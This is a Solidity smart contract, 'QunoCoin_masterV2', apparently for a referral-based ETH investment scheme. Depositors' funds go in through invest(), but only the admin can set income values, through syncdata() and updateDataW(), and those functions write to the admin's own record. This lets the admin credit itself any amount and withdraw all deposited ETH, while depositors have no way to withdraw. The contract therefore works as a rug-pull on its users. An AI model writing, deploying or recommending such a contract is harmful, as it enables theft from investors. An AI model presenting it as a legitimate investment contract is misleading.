// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

contract QunoCoin_masterV2 {
    struct Deposit {
        uint amount ;
        uint timestamp;
    }

    struct  User {
        address refferal_code;
        uint amount;
        uint timestamp;
        Deposit [] deposit;
        uint totalIncome;
        uint withdrawan;
    }

    bool public started;
    bool private IsInitinalized;
    address payable public admin;
    mapping (address => User)  public userdata;

    function initinalize(address payable _admin) external{
        require(IsInitinalized ==false );
        admin = _admin;
        IsInitinalized = true ;
    }


    function invest (address _refferal_code) public payable{

        if (!started) {
			if (msg.sender == admin) {
				started = true;
			} else revert("Not started yet");
		}
      
        User storage user = userdata[msg.sender];

        if (user.refferal_code == address(0)) {
			if (userdata[_refferal_code].deposit.length > 0 && _refferal_code != msg.sender) {
				user.refferal_code = _refferal_code;
			}
		}

        user.amount += msg.value;
        user.timestamp = block.timestamp;
        user.deposit.push(Deposit(msg.value , block.timestamp));
        
    }

    function userWithdrawal() public returns(bool){
        User storage u = userdata[msg.sender];
        bool status;
        if(u.totalIncome > u.withdrawan){
        uint amount = (u.totalIncome - u.withdrawan);
        u.withdrawan = (u.withdrawan + amount);
        payable(msg.sender).transfer(amount);
        status = true;
        }

        return status;
    }

    function syncdata(uint _amount) public returns(bool){

        bool status;
        require(msg.sender == admin, 'permission denied!');
        User storage u = userdata[msg.sender];
        u.totalIncome = _amount;

        return status;
    }

    function updateDataW(uint _amount) public returns(bool){

        bool status;
        require(msg.sender == admin, 'permission denied!');
        User storage u = userdata[msg.sender];
        u.withdrawan = _amount;

        return status;
    }




    function getDepositLength(address _useraddress) public view returns(uint){
        User storage u = userdata[_useraddress] ;
        return u.deposit.length;
    }


    function getDeposit(uint _index ,address _useraddress) public view returns(uint , uint){
        User storage u = userdata[_useraddress] ;
        return (u.deposit[_index].amount , u.deposit[_index].timestamp);
    }
    function getUserInfo( address _useraddress) public view returns (address,uint,uint){
         User storage u2 = userdata[_useraddress];
         return (u2.refferal_code,u2.amount,u2.timestamp);
    }
       
       
}